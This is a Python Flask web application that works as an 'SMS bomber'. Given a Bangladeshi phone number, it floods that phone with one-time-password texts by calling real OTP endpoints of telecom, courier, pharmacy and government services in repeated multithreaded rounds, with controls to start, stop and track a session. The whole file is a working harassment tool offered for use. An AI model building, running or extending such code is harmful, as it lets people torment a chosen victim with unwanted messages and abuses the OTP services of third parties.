from flask import Flask, render_template, request, jsonify, send_from_directory
from flask_cors import CORS
import threading
import time
import requests
import os
import json

app = Flask(__name__)
CORS(app)

# Store active bombing sessions
active_sessions = {}

# All APIs from your original script
APIS_FAST = [
    "https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn={full}&lang=en&ng=0",
    "https://fundesh.com.bd/api/auth/generateOTP?service_key=&phone={phone}",
]

APIS_NORMAL = [
    "https://webloginda.grameenphone.com/backend/api/v1/otp",
    "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php",
    "https://api.osudpotro.com/api/v1/users/send_otp",
    "https://api.apex4u.com/api/auth/login",
    "https://bb-api.bohubrihi.com/public/activity/otp",
    "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
    "https://training.gov.bd/backoffice/api/user/sendOtp",
    "https://da-api.robi.com.bd/da-nll/otp/send",
]

class BombingSession:
    def __init__(self, session_id, phone, amount, delay):
        self.session_id = session_id
        self.phone = phone
        self.full = "880" + phone[1:]  # Convert to full format
        self.amount = amount
        self.delay = delay
        self.is_running = False
        self.sent_count = 0
        self.success_count = 0
        self.failed_count = 0
        self.thread = None
        self.start_time = None

    def start(self):
        self.is_running = True
        self.start_time = time.time()
        self.thread = threading.Thread(target=self.run_bombing)
        self.thread.daemon = True
        self.thread.start()

    def stop(self):
        self.is_running = False

    def update_counter(self, success=True):
        self.sent_count += 1
        if success:
            self.success_count += 1
        else:
            self.failed_count += 1

    def fast_apis(self):
        """Call fast APIs"""
        if not self.is_running:
            return

        # First fast API
        try:
            url = f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn={self.full}&lang=en&ng=0"
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                self.update_counter(True)
            else:
                self.update_counter(False)
        except:
            self.update_counter(False)

        if not self.is_running:
            return

        # Second fast API
        try:
            url = f"https://fundesh.com.bd/api/auth/generateOTP?service_key=&phone={self.phone}"
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                self.update_counter(True)
            else:
                self.update_counter(False)
        except:
            self.update_counter(False)

    def normal_apis(self):
        """Call normal APIs with POST requests"""
        apis = [
            ("https://webloginda.grameenphone.com/backend/api/v1/otp", {"msisdn": self.full}),
            ("https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", {"phone": self.phone}),
            ("https://api.osudpotro.com/api/v1/users/send_otp", {"phone": self.phone}),
            ("https://api.apex4u.com/api/auth/login", {"phone": self.phone}),
            ("https://bb-api.bohubrihi.com/public/activity/otp", {"phone": self.phone}),
            ("https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", {"mobile": self.phone}),
            ("https://training.gov.bd/backoffice/api/user/sendOtp", {"phone": self.phone}),
            ("https://da-api.robi.com.bd/da-nll/otp/send", {"msisdn": self.full}),
        ]

        for url, data in apis:
            if not self.is_running:
                break
            try:
                response = requests.post(url, json=data, timeout=5)
                if response.status_code == 200:
                    self.update_counter(True)
                else:
                    self.update_counter(False)
            except:
                self.update_counter(False)

    def run_bombing(self):
        """Main bombing logic with all APIs"""
        round_count = 0
        
        while self.sent_count < self.amount and self.is_running:
            round_count += 1
            
            # Create threads for this round
            threads = []
            
            # Start fast APIs in multiple threads (like original)
            for _ in range(3):  # 3 threads for fast APIs
                if self.sent_count >= self.amount or not self.is_running:
                    break
                t = threading.Thread(target=self.fast_apis)
                t.daemon = True
                t.start()
                threads.append(t)
            
            # Start normal APIs in one thread
            if self.sent_count < self.amount and self.is_running:
                t = threading.Thread(target=self.normal_apis)
                t.daemon = True
                t.start()
                threads.append(t)
            
            # Wait for all threads to complete
            for t in threads:
                t.join(timeout=10)  # Timeout for safety
            
            # Wait for the specified delay before next round
            if self.sent_count < self.amount and self.is_running:
                time.sleep(self.delay)
        
        # Clean up when finished
        self.is_running = False
        if self.session_id in active_sessions:
            del active_sessions[self.session_id]

    def get_stats(self):
        """Get current session statistics"""
        current_time = time.time()
        duration = current_time - self.start_time if self.start_time else 0
        speed = self.sent_count / duration if duration > 0 else 0
        success_rate = (self.success_count / self.sent_count * 100) if self.sent_count > 0 else 0
        
        return {
            'sent_count': self.sent_count,
            'success_count': self.success_count,
            'failed_count': self.failed_count,
            'duration': round(duration, 2),
            'speed': round(speed, 2),
            'success_rate': round(success_rate, 2),
            'is_running': self.is_running,
            'target_amount': self.amount
        }

@app.route('/')
def index():
    return send_from_directory('frontend', 'index.html')

@app.route('/<path:path>')
def serve_static(path):
    return send_from_directory('frontend', path)

@app.route('/api/start-bombing', methods=['POST'])
def start_bombing():
    try:
        data = request.json
        phone = data.get('phone', '')
        amount = data.get('amount', 50)
        delay = data.get('delay', 1)
        
        # Validation
        if not phone.startswith('01') or len(phone) != 11:
            return jsonify({
                'success': False,
                'message': 'Invalid phone number. Must be 01XXXXXXXXX'
            }), 400
        
        if amount < 10 or amount > 100:
            return jsonify({
                'success': False,
                'message': 'Amount must be between 10 and 100'
            }), 400
        
        if delay < 0.5 or delay > 5:
            return jsonify({
                'success': False,
                'message': 'Delay must be between 0.5 and 5 seconds'
            }), 400
        
        # Create session
        session_id = str(int(time.time()))
        session = BombingSession(session_id, phone, amount, delay)
        
        active_sessions[session_id] = session
        session.start()
        
        return jsonify({
            'success': True,
            'session_id': session_id,
            'message': f'SMS bombing started for {phone}'
        })
        
    except Exception as e:
        return jsonify({
            'success': False,
            'message': f'Error starting bombing: {str(e)}'
        }), 500

@app.route('/api/stop-bombing', methods=['POST'])
def stop_bombing():
    try:
        data = request.json
        session_id = data.get('session_id')
        
        if not session_id:
            return jsonify({
                'success': False,
                'message': 'Session ID is required'
            }), 400
        
        if session_id in active_sessions:
            session = active_sessions[session_id]
            session.stop()
            
            stats = session.get_stats()
            del active_sessions[session_id]
            
            return jsonify({
                'success': True,
                'message': 'Bombing stopped successfully',
                'final_stats': stats
            })
        else:
            return jsonify({
                'success': False,
                'message': 'Session not found'
            }), 404
            
    except Exception as e:
        return jsonify({
            'success': False,
            'message': f'Error stopping bombing: {str(e)}'
        }), 500

@app.route('/api/session-stats/<session_id>')
def get_session_stats(session_id):
    """Get real-time statistics for a session"""
    if session_id in active_sessions:
        session = active_sessions[session_id]
        stats = session.get_stats()
        
        return jsonify({
            'success': True,
            'session_id': session_id,
            'stats': stats
        })
    else:
        return jsonify({
            'success': False,
            'message': 'Session not found'
        }), 404

@app.route('/api/active-sessions')
def get_active_sessions():
    """Get list of all active sessions"""
    sessions_info = []
    for session_id, session in active_sessions.items():
        sessions_info.append({
            'session_id': session_id,
            'phone': session.phone,
            'stats': session.get_stats()
        })
    
    return jsonify({
        'success': True,
        'active_sessions': len(active_sessions),
        'sessions': sessions_info
    })

@app.route('/api/system-info')
def get_system_info():
    """Get system information"""
    return jsonify({
        'success': True,
        'version': '2.1',
        'total_apis': len(APIS_FAST) + len(APIS_NORMAL),
        'fast_apis': len(APIS_FAST),
        'normal_apis': len(APIS_NORMAL),
        'active_sessions': len(active_sessions),
        'server_time': time.strftime('%Y-%m-%d %H:%M:%S')
    })

@app.route('/api/test-apis')
def test_apis():
    """Test if APIs are working"""
    test_results = []
    
    # Test fast APIs
    for api in APIS_FAST:
        try:
            test_url = api.format(phone="01700000000", full="8801700000000")
            response = requests.get(test_url, timeout=5)
            test_results.append({
                'api': api,
                'status': 'working' if response.status_code == 200 else 'error',
                'status_code': response.status_code
            })
        except Exception as e:
            test_results.append({
                'api': api,
                'status': 'error',
                'error': str(e)
            })
    
    # Test normal APIs
    test_data = {"phone": "01700000000", "msisdn": "8801700000000"}
    for api in APIS_NORMAL:
        try:
            response = requests.post(api, json=test_data, timeout=5)
            test_results.append({
                'api': api,
                'status': 'working' if response.status_code == 200 else 'error',
                'status_code': response.status_code
            })
        except Exception as e:
            test_results.append({
                'api': api,
                'status': 'error',
                'error': str(e)
            })
    
    return jsonify({
        'success': True,
        'test_results': test_results
    })

# Clean up finished sessions periodically
def cleanup_sessions():
    while True:
        time.sleep(60)  # Check every minute
        finished_sessions = []
        for session_id, session in active_sessions.items():
            if not session.is_running or session.sent_count >= session.amount:
                finished_sessions.append(session_id)
        
        for session_id in finished_sessions:
            del active_sessions[session_id]

# Start cleanup thread
cleanup_thread = threading.Thread(target=cleanup_sessions)
cleanup_thread.daemon = True
cleanup_thread.start()

if __name__ == '__main__':
    # Create frontend directory if it doesn't exist
    if not os.path.exists('frontend'):
        os.makedirs('frontend')
    
    print("🚀 Child Coder BD SMS Bomber Web Version Starting...")
    print("📧 Total APIs Available:")
    print(f"   - Fast APIs: {len(APIS_FAST)}")
    print(f"   - Normal APIs: {len(APIS_NORMAL)}")
    print(f"   - Total: {len(APIS_FAST) + len(APIS_NORMAL)}")
    print("🌐 Server running on: http://localhost:5000")
    
    app.run(debug=True, host='0.0.0.0', port=5000, threaded=True)
